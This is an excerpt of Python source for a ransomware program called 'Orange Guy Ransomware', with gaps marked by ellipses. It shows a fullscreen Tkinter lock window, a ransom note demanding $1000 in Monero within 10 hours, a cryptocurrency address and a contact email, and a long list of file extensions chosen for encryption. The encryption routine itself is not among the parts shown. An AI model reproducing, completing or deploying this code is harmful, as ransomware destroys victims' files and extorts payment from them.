...
class mainwindow(Tk):
    def __init__(self):
        ...
        self.geometry("{0}x{1}+0+0".format(self.winfo_screenwidth(), self.winfo_screenheight())) # Make fullscreen
...
vV4t+0UE/G5fAN2ccz9Ug6PdAAAAAElFTkSuQmCC'''
        ...
        message = '''
Seems like you got hit by Orange Guy Ransomware!

Don't Panic, you get have your files back!

Orange Guy uses a strong encryption script to lock your files.
...
You have 10 hours to request your key!!!

Send $1000 worth of Monero to this address:
852a5u1JJaZYqgpUwRVMwbiBgtAWrKKBNJ3L77BVJzwJSwGK1XPrhzhD9sHoKvbe2GUYriaYqTndpJ3atxTrf3DH61jKut5

After that send the proof of payment to this email address: orangeguyhck@proton.me
...
ext = ['.txt',
    ...
    '.iso','.zip','.tar','.tar.gz','.rar','.jpeg','.3dm','.max','.tif','.bmp','.db','.dbf','.sql','.dwg','.c','.cs','.php','.asp','.java','.jar','.class',
    '.js','.aaf','.aep','.aepx','.plb','.prel','.prproj','.xls','.xlsx','.xlsm','.dot','.xltx','.xltm','.mp4','.mpeg','.asx','.dat','.csv','.avi','.3gp','.asf',
    '.pptx','.pps','.potx','.xlm','.xlt','.msg','.rtf','.dotx','.iff','.wma','.sldx','.py','.wpd','.pptm','.avi']
